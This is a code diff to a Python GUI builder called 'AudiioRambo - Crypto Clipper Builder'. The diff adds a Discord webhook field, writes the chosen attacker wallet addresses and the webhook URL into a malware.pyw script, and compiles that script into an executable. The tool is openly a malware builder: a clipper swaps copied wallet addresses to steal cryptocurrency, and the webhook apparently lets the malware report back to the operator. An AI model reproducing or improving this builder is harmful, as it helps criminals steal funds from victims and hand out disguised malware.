@@ -8,7 +8,7 @@ ctk.set_appearance_mode("dark")  # "dark", "light", or "system"
 ctk.set_default_color_theme("green")  # Available themes: "blue", "dark-blue", "green"
 
 app = ctk.CTk()
-app.geometry("700x800")
+app.geometry("700x900")  # Slightly taller to accommodate webhook field
 app.title("AudiioRambo - Crypto Clipper Builder")
 
 # Apply a custom background color and make it darker
@@ -62,6 +62,17 @@ for crypto in crypto_options.keys():
 
     crypto_options[crypto] = entry
 
+# Discord Webhook Input
+webhook_frame = ctk.CTkFrame(background_frame, fg_color="#1A1A1A", corner_radius=8)
+webhook_frame.pack(fill="x", padx=20, pady=10)
+
+webhook_label = ctk.CTkLabel(webhook_frame, text="Discord Webhook:", font=font_label, text_color="#00FF00")
+webhook_label.pack(side="left", padx=10)
+
+webhook_entry = ctk.CTkEntry(webhook_frame, placeholder_text="Enter Discord Webhook URL", 
+                            fg_color="#2A2A2A", text_color="#00FF00", width=400)
+webhook_entry.pack(side="left", fill="x", expand=True, padx=5)
+
 # Icon file selection
 icon_path = ctk.StringVar()
 
@@ -81,6 +92,7 @@ icon_button.pack(pady=5)
 # Function to build the executable
 def build_malware():
     selected_addresses = {}
+    webhook_url = webhook_entry.get().strip()
 
     for crypto, entry in crypto_options.items():
         if crypto_vars[crypto].get() == 1:  # If the checkbox is checked
@@ -89,18 +101,19 @@ def build_malware():
                 selected_addresses[crypto] = address
 
     try:
-        # Embed addresses directly into the malware.pyw script
-        with open("malware.pyw", "r", encoding="utf-8") as f:  # Specify UTF-8 encoding
+        # Embed addresses and webhook into the malware.pyw script
+        with open("malware.pyw", "r", encoding="utf-8") as f:
             lines = f.readlines()
 
-        # Find the line where crypto_addresses is defined and replace it
+        # Find and replace both crypto_addresses and webhook_url
         for i, line in enumerate(lines):
             if line.strip().startswith("crypto_addresses = {"):
                 lines[i] = f"crypto_addresses = {selected_addresses}\n"
-                break
+            elif line.strip().startswith('webhook_url = "'):
+                lines[i] = f'webhook_url = "{webhook_url}"\n' if webhook_url else 'webhook_url = ""\n'
 
-        # Write the modified content back to malware.pyw
-        with open("malware.pyw", "w", encoding="utf-8") as f:  # Specify UTF-8 encoding
+        # Write the modified content back
+        with open("malware.pyw", "w", encoding="utf-8") as f:
             f.writelines(lines)
 
         # Build the executable with PyInstaller
@@ -109,7 +122,7 @@ def build_malware():
 
         result_label.configure(text="[+] Build complete! Executable created.", text_color="#00FF00")
     except Exception as e:
-        result_label.configure(text=f"[!] Error: {str(e)}", text_color="#FF0000")  # Show error message
+        result_label.configure(text=f"[!] Error: {str(e)}", text_color="#FF0000")
 
 # Build Button
 build_button = ctk.CTkButton(background_frame, text="[+] Build Executable", command=build_malware, font=font_button, fg_color="#D32F2F", hover_color="#B71C1C")  # Red button for build
